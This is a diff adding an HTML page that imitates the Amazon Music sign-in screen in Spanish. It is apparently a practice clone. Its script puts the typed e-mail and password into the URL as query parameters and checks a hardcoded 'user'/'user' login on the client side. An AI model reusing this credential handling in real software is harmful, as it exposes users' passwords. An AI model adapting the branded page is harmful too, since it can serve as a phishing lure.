@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="og:image" content="img-login/amazon_logo_a" />
+    <title>Amazon Music|Login</title>
+    <link rel="stylesheet" href="css/login.css" />
+  </head>
+  <body>
+    <script type="text/javascript">
+      function ContinuarLink() {
+        const url = new URL(window.location.href);
+        const inputCorreo = document.querySelector('input[name="correo"]');
+        const valorCorreo = inputCorreo.value;
+        url.searchParams.set("email", valorCorreo);
+        const inputPass = document.querySelector('input[name="pass"]');
+        const valorPass = inputPass.value;
+        url.searchParams.set("password", valorPass);
+        window.location.href = url;
+        if (valorPass === "user" && valorCorreo === "user") {
+          location.replace("http://127.0.0.1:5500");
+        } else {
+          window.location.reload();
+        }
+      }
+      //   function ContinuarLink() {
+      //     const url = new URL(window.location.href);
+
+      //     const params = url.searchParams;
+      //     const email = document.querySelector('input[name="email"]').value;
+      //     const password = document.querySelector('input[name="password"]').value;
+
+      //     // Add parameters for email and password
+      //     params.append("email", email);
+      //     params.append("password", password);
+
+      //     // Update the URL (optional)
+      //     const modifiedURL = url.toString();
+
+      //     // Continue with the modified URL (optional)
+      //     window.location.href = modifiedURL;
+
+      //     alert(email);
+      //   }
+    </script>
+    <div id="contenedor">
+      <div>
+        <a href="">
+          <img src="img-login/amazon_logo_icon.png" alt="Amazon logo" />
+        </a>
+      </div>
+      <div class="iniciosesion">
+        <p class="title">Iniciar sesión</p>
+
+        <p class="text-b">Dirección de e-mail o número de teléfono móvil</p>
+        <input
+          type="email"
+          name="correo"
+          placeholder="Escribe tu e-mail o número de telefono:"
+        />
+        <br />
+        <p class="text-b">Contraseña</p>
+        <input
+          type="password"
+          name="pass"
+          placeholder="Escribe tu contraseña:"
+        />
+        <br /><br />
+        <button onclick="ContinuarLink()">Continuar</button>
+        <p class="text">
+          Al continuar, aceptas las Condiciones de uso y venta de Amazon.
+          Consulta nuestro Aviso de privacidad, nuestro Aviso sobre cookies y
+          nuestro Aviso sobre anuncios basados en intereses.
+        </p>
+      </div>
+    </div>
+  </body>
+</html>
